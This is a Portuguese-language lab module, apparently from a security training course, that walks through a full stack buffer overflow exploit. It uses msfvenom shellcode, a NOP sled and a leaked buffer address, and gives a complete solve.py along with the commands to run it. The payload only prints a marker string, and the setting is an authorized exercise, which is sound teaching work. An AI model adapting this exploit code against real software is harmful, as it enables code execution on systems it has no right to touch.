# Buffer overflow: payload do msfvenom no buffer

Modulo de fechamento. Ele une os dois blocos novos: o **Metasploit** (modulos 8 e
9, onde o `msfvenom` gerava o shellcode) e o **buffer overflow** (modulos 14 a 16,
onde voce entregava bytes pela corrupcao da pilha). Agora o shellcode injetado no
buffer vem do `msfvenom`.

## O plano

Igual ao modulo 16, mas o shellcode e gerado pela ferramenta:

```
buffer: [ NOP sled ][ shellcode do msfvenom ][ NOPs ][ ret = buf ]
```

Gere o shellcode raw com o `msfvenom`:

```bash
msfvenom -p linux/x64/exec CMD='/bin/echo MSF_BUF_OK' -f raw -o /tmp/sc.bin
```

Depois embrulhe esses bytes no payload do overflow (sled + shellcode + padding +
endereco de retorno apontando para o buffer). O `solve.py` faz isso: usa o
`msfvenom` se existir e, caso contrario, cai para um shellcode equivalente em
`pwntools` (ambos produzem `MSF_BUF_OK`).

## O que voce precisa fazer

```python
from pwn import asm, p64, context
import subprocess, re, shutil

context.arch = "amd64"
subprocess.run(["gcc", "-O0", "-fno-stack-protector", "-no-pie", "-z", "execstack",
                "/challenge/vuln.c", "-o", "/tmp/vuln"], check=True)

# 1) shellcode via msfvenom; fallback em pwntools
if shutil.which("msfvenom"):
    subprocess.run(["msfvenom", "-p", "linux/x64/exec",
                    "CMD=/bin/echo MSF_BUF_OK", "-f", "raw", "-o", "/tmp/sc.bin"],
                   check=True)
    shellcode = open("/tmp/sc.bin", "rb").read()
else:
    shellcode = asm('''
        mov eax, 1
        mov edi, 1
        lea rsi, [rip + message]
        mov edx, 11
        syscall
        mov eax, 60
        xor edi, edi
        syscall
    message:
        .ascii "MSF_BUF_OK\\n"
    ''')

# 2) vazar o endereco do buffer
open("/home/hacker/payload.bin", "wb").write(b"\x90" * 8)
leak = subprocess.run(["/tmp/vuln", "/home/hacker/payload.bin"],
                      capture_output=True).stderr.decode()
buf = int(re.search(r"buf = (0x[0-9a-f]+)", leak).group(1), 16)

# 3) montar o payload do overflow
offset = 136
body = b"\x90" * 16 + shellcode
assert len(body) <= offset, "shellcode grande demais para este buffer"
payload = body + b"\x90" * (offset - len(body)) + p64(buf)
open("/home/hacker/payload.bin", "wb").write(payload)
```

## Fluxo completo

```bash
python3 /home/hacker/solve.py
/challenge/check
```

## Por que isto importa

Este e o fluxo que une tudo: uma ferramenta gera o shellcode, uma vulnerabilidade
de memoria o entrega e a pilha executavel o roda. Entender cada peca separadamente
(que foi o percurso do dojo inteiro) e o que permite tanto construir o exploit em
laboratorio autorizado quanto reconhecer e defender cada etapa na pratica.
